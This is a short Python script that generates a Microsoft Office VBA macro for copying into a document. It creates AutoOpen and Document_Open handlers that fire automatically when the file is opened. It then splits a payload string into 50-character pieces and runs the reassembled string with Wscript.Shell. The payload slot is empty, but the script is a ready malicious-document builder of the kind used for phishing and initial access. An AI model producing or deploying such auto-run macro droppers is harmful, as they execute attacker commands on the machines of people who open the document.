#!/usr/bin/env python3

# The string to chunk down into acceptable sizes
str = ""

# The size of each line in the variable
n = 50

# Edit this to set the name of the macro
macro_name = 'MyEdits'

# End of each macro section
end_sub ='End Sub'

# The structure of a macro with AutoOpen and Sub Document parts.
macro = 'Sub AutoOpen()\n'
macro += f'  {macro_name}\n'
macro += f'{end_sub}\n'
macro += '\nSub Document_Open()\n'
macro += f'  {macro_name}\n'
macro += f'{end_sub}\n'
macro += f'\nSub {macro_name}()\n'
macro += '\n  Dim Str As String\n'

# Output to the screen for copy and paste
print(macro)

for i in range(0, len(str), n):
	print("  Str = Str + " + '"' + str[i:i+n] + '"')

print('\n  CreateObject("Wscript.Shell").Run Str')
print(f'\n{end_sub}')
